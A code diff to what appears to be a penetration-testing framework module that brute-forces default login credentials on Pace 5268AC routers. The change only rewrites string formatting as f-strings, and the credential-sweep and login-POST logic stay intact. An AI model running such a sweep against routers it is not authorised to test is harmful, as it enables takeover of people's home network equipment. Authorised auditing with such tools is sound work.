@@ -74,26 +74,24 @@ class Exploit(HTTPClient):
     def run(self) -> None:
         if not self.check():
             print_error(
-                "Target {}:{} is not reachable or not a Pace 5268AC".format(
-                    self.target, self.port
-                )
+                f"Target {self.target}:{self.port} is not reachable or not a Pace 5268AC"
             )
             return
 
-        print_status("Starting default credential sweep against {}:{}".format(self.target, self.port))
+        print_status(f"Starting default credential sweep against {self.target}:{self.port}")
         self.credentials = []
 
         for username, password in self._DEFAULT_CREDS:
-            display_pw = "'{}'".format(password) if password else "(blank)"
+            display_pw = f"'{password}'" if password else "(blank)"
             if self.verbosity:
-                print_status("Trying {} / {} ...".format(username, display_pw))
+                print_status(f"Trying {username} / {display_pw} ...")
 
             if self._try_login(username, password):
                 print_success(
-                    "Valid credentials: username='{}' password={}".format(username, display_pw)
+                    f"Valid credentials: username='{username}' password={display_pw}"
                 )
                 print_info(
-                    "Login URL: http://{}:{}{} ".format(self.target, self.port, self._LOGIN_PATH)
+                    f"Login URL: http://{self.target}:{self.port}{self._LOGIN_PATH} "
                 )
                 self.credentials.append((self.target, self.port, "HTTP", username, password))
                 if self.stop_on_first:
@@ -117,12 +115,10 @@ class Exploit(HTTPClient):
         return resp2 is not None and resp2.status_code in (200, 301, 302)
 
     def _try_login(self, username: str, password: str) -> bool:
-        post_data = "username={}&password={}".format(
-            utils.url_encode(username), utils.url_encode(password)
-        )
+        post_data = f"username={utils.url_encode(username)}&password={utils.url_encode(password)}"
         headers = {
             "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "http://{}:{}{}".format(self.target, self.port, self._LOGIN_PATH),
+            "Referer": f"http://{self.target}:{self.port}{self._LOGIN_PATH}",
         }
         resp = self.http_request(
             method="POST",
